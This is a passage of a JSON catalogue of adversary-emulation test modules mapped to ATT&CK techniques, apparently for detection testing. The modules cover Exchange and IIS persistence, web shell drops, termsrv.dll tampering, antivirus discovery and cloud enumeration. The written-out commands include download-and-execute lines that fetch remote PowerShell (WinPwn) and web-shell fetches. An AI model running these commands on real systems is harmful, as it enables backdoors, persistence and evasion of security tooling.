        "command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n",
        "elevation_required": true,
        "cleanup_command": "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){\n  Disable-TransportAgent #{transport_agent_identity}\n  Uninstall-TransportAgent #{transport_agent_identity}\n  Get-TransportAgent\n}\n"
      },
      "variables": [
        {
          "name": "class_factory",
          "description": "Class factory of transport agent.",
          "type": "string",
          "default_value": "Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory"
        },
        {
          "name": "dll_path",
          "description": "Path of DLL to use as transport agent.",
          "type": "path",
          "default_value": "c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll"
        },
        {
          "name": "transport_agent_identity",
          "description": "Friendly name of transport agent once installed.",
          "type": "string",
          "default_value": "Security Interop Agent"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft Exchange SnapIn must be installed\n",
          "check_command": "Get-TransportAgent -TransportService FrontEnd\n",
          "install_command": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn\n"
        }
      ],
      "rx_module_id": "43e92449-ff60-46e9-83a3-1a38089df94d",
      "module_name": "Install MS Exchange Transport Agent Persistence"
    },
    {
      "index": 1143,
      "technique_id": "T1505.003",
      "technique_name": "Server Software Component: Web Shell",
      "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "xcopy /I /Y \"#{web_shells}\" #{web_shell_path}\n",
        "elevation_required": false,
        "cleanup_command": "del #{web_shell_path}\\b.jsp /q >nul 2>&1\ndel #{web_shell_path}\\tests.jsp /q >nul 2>&1\ndel #{web_shell_path}\\cmd.aspx /q >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "web_shell_path",
          "description": "The path to drop the web shell",
          "type": "string",
          "default_value": "C:\\inetpub\\wwwroot"
        },
        {
          "name": "web_shells",
          "description": "Path of Web Shell",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1505.003\\src"
        }
      ],
      "prerequisites": [
        {
          "description": "Web shell must exist on disk at specified location (#{web_shells})\n",
          "check_command": "if (Test-Path \"#{web_shells}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"#{web_shells}\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1505.003/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1505.003/src/tests.jsp\" -OutFile \"#{web_shells}/tests.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1505.003/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\"\n"
        }
      ],
      "rx_module_id": "0a2ce662-1efa-496f-a472-2fe7b080db16",
      "module_name": "Web Shell Written to Disk"
    },
    {
      "index": 1144,
      "technique_id": "T1505.004",
      "technique_name": "IIS Components",
      "description": "The following RAGLOX will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis raglox utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:#{module_name} /image:#{dll_path}\n",
        "elevation_required": false,
        "cleanup_command": "%windir%\\system32\\inetsrv\\appcmd.exe uninstall module #{module_name}\n"
      },
      "variables": [
        {
          "name": "module_name",
          "description": "The name of the IIS module",
          "type": "string",
          "default_value": "DefaultDocumentModule_RAGLOX"
        },
        {
          "name": "dll_path",
          "description": "The path to the DLL to be loaded",
          "type": "path",
          "default_value": "%windir%\\system32\\inetsrv\\defdoc.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "IIS must be installed in order to add a module to IIS.\n",
          "check_command": "$service = get-service w3svc -ErrorAction SilentlyContinue\nif($service){ Write-Host \"IIS installed on $env:computername\" } else { Write-Host \"IIS is not installed on $env:computername\" } \n",
          "install_command": "Install IIS to continue.\n"
        }
      ],
      "rx_module_id": "53adbdfa-8200-490c-871c-d3b1ab3324b2",
      "module_name": "Install IIS Module using AppCmd.exe"
    },
    {
      "index": 1145,
      "technique_id": "T1505.004",
      "technique_name": "IIS Components",
      "description": "The following RAGLOX will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis raglox utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-WebGlobalModule -Name #{module_name}\n"
      },
      "variables": [
        {
          "name": "module_name",
          "description": "The name of the IIS module",
          "type": "string",
          "default_value": "DefaultDocumentModule_RAGLOX"
        },
        {
          "name": "dll_path",
          "description": "The path to the DLL to be loaded",
          "type": "path",
          "default_value": "%windir%\\system32\\inetsrv\\defdoc.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "IIS must be installed in order to add a module to IIS.\n",
          "check_command": "$service = get-service w3svc -ErrorAction SilentlyContinue\nif($service){ Write-Host \"IIS installed on $env:computername\" } else { Write-Host \"IIS is not installed on $env:computername\" } \n",
          "install_command": "Install IIS to continue.\n"
        }
      ],
      "rx_module_id": "cc3381fb-4bd0-405c-a8e4-6cacfac3b06c",
      "module_name": "Install IIS Module using PowerShell Cmdlet New-WebGlobalModule"
    },
    {
      "index": 1146,
      "technique_id": "T1505.005",
      "technique_name": "Server Software Component: Terminal Services DLL",
      "description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore\nMove-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n",
        "elevation_required": true,
        "cleanup_command": "Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0b2eadeb-4a64-4449-9d43-3d999f4a317b",
      "module_name": "Simulate Patching termsrv.dll"
    },
    {
      "index": 1147,
      "technique_id": "T1505.005",
      "technique_name": "Server Software Component: Terminal Services DLL",
      "description": "This RAGLOX module simulates the modification of the ServiceDll value in HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters. This technique may be leveraged by adversaries to establish persistence by loading a patched version of the DLL containing malicious code.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path $termsrvDll -Destination \"$HOME\\RAGLOXTest.dll\"\n\n$newServiceDll = \"$HOME\\RAGLOXTest.dll\"\n\n$registryPath = \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\"\n\n# Check if the registry key exists\nif (Test-Path -Path $registryPath) {\n    # Modify the ServiceDll value in the registry\n    Set-ItemProperty -Path $registryPath -Name \"ServiceDll\" -Value $newServiceDll\n    Write-Host \"ServiceDll value in the registry has been updated to: $newServiceDll\"\n} else {\n    Write-Host \"Registry key not found. Make sure the 'TermService\\Parameters' key exists.\"\n}",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\services\\TermService\\Parameters\" -Name \"ServiceDll\" -Value \"C:\\Windows\\System32\\termsrv.dll\""
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "18136e38-0530-49b2-b309-eed173787471",
      "module_name": "Modify Terminal Services DLL Path"
    },
    {
      "index": 1148,
      "technique_id": "T1518",
      "technique_name": "Software Discovery",
      "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "68981660-6670-47ee-a5fa-7e74806420a4",
      "module_name": "Find and Display Internet Explorer Browser Version"
    },
    {
      "index": 1149,
      "technique_id": "T1518",
      "technique_name": "Software Discovery",
      "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b",
      "module_name": "Applications Installed"
    },
    {
      "index": 1150,
      "technique_id": "T1518",
      "technique_name": "Software Discovery",
      "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "103d6533-fd2a-4d08-976a-4a598565280f",
      "module_name": "Find and Display Safari Browser Version"
    },
    {
      "index": 1151,
      "technique_id": "T1518",
      "technique_name": "Software Discovery",
      "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7e79a1b6-519e-433c-ad55-3ff293667101",
      "module_name": "WinPwn - Dotnetsearch"
    },
    {
      "index": 1152,
      "technique_id": "T1518",
      "technique_name": "Software Discovery",
      "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "10ba02d0-ab76-4f80-940d-451633f24c5b",
      "module_name": "WinPwn - DotNet"
    },
    {
      "index": 1153,
      "technique_id": "T1518",
      "technique_name": "Software Discovery",
      "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0bb64470-582a-4155-bde2-d6003a95ed34",
      "module_name": "WinPwn - powerSQL"
    },
    {
      "index": 1154,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f92a380f-ced9-491f-b338-95a991418ce2",
      "module_name": "Security Software Discovery"
    },
    {
      "index": 1155,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\nget-process | ?{$_.Description -like \"*mc*\"}\nget-process | ?{$_.ProcessName -like \"*mc*\"}\nget-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7f566051-f033-49fb-89de-b6bacab730f0",
      "module_name": "Security Software Discovery - powershell"
    },
    {
      "index": 1156,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ba62ce11-e820-485f-9c17-6f3c857cd840",
      "module_name": "Security Software Discovery - ps (macOS)"
    },
    {
      "index": 1157,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "23b91cd2-c99c-4002-9e41-317c63e024a2",
      "module_name": "Security Software Discovery - ps (Linux)"
    },
    {
      "index": 1158,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell is going to display AV/Security software it is running.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fa96c21c-5fd6-4428-aa28-51a2fbecdbdc",
      "module_name": "Security Software Discovery - pgrep (FreeBSD)"
    },
    {
      "index": 1159,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "fltmc.exe | findstr.exe 385201\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fe613cf3-8009-4446-9a0f-bc78a15b66c9",
      "module_name": "Security Software Discovery - Sysmon Service"
    },
    {
      "index": 1160,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1553252f-14ea-4d3b-8a08-d7a4211aa945",
      "module_name": "Security Software Discovery - AV Discovery via WMI"
    },
    {
      "index": 1161,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.\n\nwhen sucessfully executed, information about installed AV software is displayed..\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "015cd268-996e-4c32-8347-94c80c6286ee",
      "module_name": "Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets"
    },
    {
      "index": 1162,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Service WinDefend #check the service state of Windows Defender\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\nGet-MpThreat #threats details that have been detected using MS Defender\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d3415a0e-66ef-429b-acf4-a768876954f6",
      "module_name": "Security Software Discovery - Windows Defender Enumeration"
    },
    {
      "index": 1163,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-NetFirewallProfile | Format-Table Name, Enabled\nGet-NetFirewallSetting\nGet-NetFirewallRule | select DisplayName, Enabled, Description\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9dca5a1d-f78c-4a8d-accb-d6de67cfed6b",
      "module_name": "Security Software Discovery - Windows Firewall Enumeration"
    },
    {
      "index": 1164,
      "technique_id": "T1518.001",
      "technique_name": "Software Discovery: Security Software Discovery",
      "description": "In this test, a WMIC command is used to probe the local Windows system for the configuration of Windows Defender's exclusions. This command targets the MSFT_MpPreference \nclass within the Windows Management Instrumentation (WMI) namespace, allowing the retrieval of critical settings such as disabled real-time monitoring and specified \nexclusion paths, file extensions, and processes. Attackers might use this approach to understand what is excluded from antivirus scans, enabling further exploitation.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get /format:list | findstr /i /C:\"DisableRealtimeMonitoring\" /C:\"ExclusionPath\" /C:\"ExclusionExtension\" /C:\"ExclusionProcess\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e31564c8-4c60-40cd-a8f4-9261307e8336",
      "module_name": "Get Windows Defender exclusion settings using WMIC"
    },
    {
      "index": 1165,
      "technique_id": "T1526",
      "technique_name": "Cloud Service Discovery",
      "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "import-module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder #{output_directory} -subscription \"#{subscription_name}\" -verbose\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_directory} -recurse -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "T1082Az"
        },
        {
          "name": "output_directory",
          "description": "Directory to output results to",
          "type": "string",
          "default_value": "$env:temp\\T1526Test1"
        },
        {
          "name": "subscription_name",
          "description": "Azure subscription name to scan",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "The Get-AzDomainInfo script must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n"
        },
        {
          "description": "The Az module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name Az -Force\n"
        }
      ],
      "rx_module_id": "1e40bb1d-195e-401e-a86b-c192f55e005c",
      "module_name": "Azure - Dump Subscription Data with MicroBurst"
    },
    {
      "index": 1166,
      "technique_id": "T1526",
      "technique_name": "Cloud Service Discovery",
      "description": "Upon successful execution, this test will enumerate common resources that are contained within a valid AWS account.\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder\\T1526\\src\\AWSDiscovery.ps1\"\n$access_key = \"#{access_key}\"\n$secret_key = \"#{secret_key}\"\n$session_token = \"#{session_token}\"\n$aws_profile = \"#{profile}\"\n$regions = \"#{regions}\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile\nGet-AWSDiscoveryData -Regions $regions -OutputDirectory \"#{output_directory}\"\nRemove-BlankFiles -OutputDirectory \"#{output_directory}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "access_key",
          "description": "AWS Access Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "secret_key",
          "description": "AWS Secret Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "session_token",
          "description": "AWS Session Token",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "profile",
          "description": "AWS profile",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "regions",
          "description": "AWS regions",
          "type": "string",
          "default_value": "us-east-1,us-east-2,us-west-1,us-west-2"
        },
        {
          "name": "output_directory",
          "description": "Directory to output results to",
          "type": "string",
          "default_value": "$env:TMPDIR/aws_discovery"
        }
      ],
      "prerequisites": [
        {
          "description": "The AWS PowerShell module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AWSPowerShell -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AWSPowerShell -Force\n"
        }
      ],
      "rx_module_id": "aa8b9bcc-46fa-4a59-9237-73c7b93a980c",
      "module_name": "AWS - Enumerate common cloud services"
    },
    {
      "index": 1167,
      "technique_id": "T1526",
      "technique_name": "Cloud Service Discovery",
      "description": "Upon successful execution, this test will enumerate common resources that are contained within a valid Azure subscription.\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder\\T1526\\src\\AzureDiscovery.ps1\"\n$client_id = \"#{client_id}\"\n$client_secret = \"#{client_secret}\"\n$tenant_id = \"#{tenant_id}\"\n$environment = \"#{cloud}\"\nSet-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment\nGet-AzureDiscoveryData -OutputDirectory \"#{output_directory}\" -Environment $environment\nRemove-BlankFiles -OutputDirectory \"#{output_directory}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "client_id",
          "description": "Azure AD client ID",
          "type": "string",
          "default_value": null
        },
        {
          "name": "client_secret",
          "description": "Azure AD client secret",
          "type": "string",
          "default_value": null
        },
        {
          "name": "tenant_id",
          "description": "Azure AD tenant ID",
          "type": "string",
          "default_value": null
        },
        {
          "name": "cloud",
          "description": "Azure cloud environment",
          "type": "string",
          "default_value": "AzureCloud"
        },
        {
          "name": "output_directory",
          "description": "Directory to output results to",
          "type": "string",
          "default_value": "$env:TMPDIR/azure_discovery"
        }
      ],
      "prerequisites": [
        {
          "description": "The Az module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name Az -Force\n"
        }
      ],
      "rx_module_id": "58f57c8f-db14-4e62-a4d3-5aaf556755d7",
      "module_name": "Azure - Enumerate common cloud services"
    },
    {
      "index": 1168,
      "technique_id": "T1528",
      "technique_name": "Steal Application Access Token",
